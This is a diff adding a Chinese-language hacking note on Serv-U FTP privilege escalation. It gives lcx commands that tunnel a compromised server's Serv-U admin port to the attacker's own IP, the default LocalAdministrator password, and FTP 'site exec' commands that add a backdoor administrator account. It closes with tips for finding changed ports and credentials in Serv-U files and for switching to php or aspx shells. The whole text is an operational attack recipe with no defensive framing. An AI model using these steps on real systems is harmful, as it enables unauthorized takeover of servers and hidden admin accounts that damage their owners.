@@ -1,0 +1,42 @@
+serv-u端口转发提权  前提是默认账号密码没改 或者密码自己知道
+
+提权技巧之serv-u端口转发提权：
+
+1、在服务器上cmd 执行： lcx -slave 我的IP 5000 127.0.0.1 43958(有可能被改)
+
+2、 在本机运行 lcx -listen 5000 21 (lcx地址要写对)
+
+3、 打开本地的serv u 在IP上填入127.0.0.1 帐号：LocalAdministrator 密码：#l@$ak#.lk;0@P (密码帐号有可能改 自己下文件看密码)
+
+此时的链接过程是本机连接21端口----转发往本机5000端口-----管道连接至远程机5000端口------转发至远程43958端口
+
+连接成功后，在本机登录的serv-u相当于远程的serv-u
+
+可以ftp本机IP输入上面的帐号密码，在远程ftp服务器执行命令
+
+1.quote site exec net user admin admin /add  
+2.quote site exec net localgroup administrators admin /add
+
+
+
+有个问题  serv-u的账号密码 能不能本机得到
+
+在提权不成功,排除种种原因：
+
+一、发现是servu默认端口被改的时候。
+
+在servu的目录下的ServUStartUplog.txt 文件我们可以看到servu连接时的日志文件。
+
+\serv-U\ServUStartUplog.txt 查看被修改的servU端口号
+
+Sun .... xx:xx:xx - FTP...... on port number :[这边就是端口号]
+
+
+二、如果默认用户名和密码被修改的时候，也可以到ServUAdmin.exe里查看。
+
+三、在ServUDaemon.ini里可以查看准确的版本号。
+
+
+serv-U提权时，asp提权不成功时，可以试试php版的serv-U提权。
+
+也许可以成功，因为php权限比asp要大。还有aspx的
